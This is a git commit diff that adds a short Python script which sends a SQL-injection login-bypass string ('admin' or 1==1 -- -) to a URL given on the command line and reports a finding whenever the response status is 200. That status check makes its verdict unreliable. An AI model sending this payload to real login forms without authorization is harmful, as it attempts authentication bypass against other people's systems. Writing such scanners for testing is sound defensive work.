93cf4dc8a7dee1ba810604eaca14e2533057197f
Bishal Aryal <70318933+C15C01337@users.noreply.github.com>
2022-09-20 08:49:00 +0545

    Update Detect-sql-injection.py

--- Detect-sql-injection.py
+++ Detect-sql-injection.py
@@ -1,1 +1,24 @@
+# detect sql injection using python
 
+import requests
+import sys
+
+
+def check_sql_injection():
+    if len(sys.argv) != 2:
+        print("Usage: python3 practice.py <url>")
+        sys.exit(1)
+    global url
+    url = sys.argv[1]
+    print("URL: " + url)
+    print("Checking for SQL injection...")
+    # check for sql injection
+    test = "admin' or 1==1 -- -"
+    payload = {'uname':test, 'pass':'test'}
+    r = requests.post(url, params=payload)
+    code = r.status_code
+    if code == 200:
+        print("SQL injection found!")
+    else:
+        print("SQL injection not found.")
+check_sql_injection()
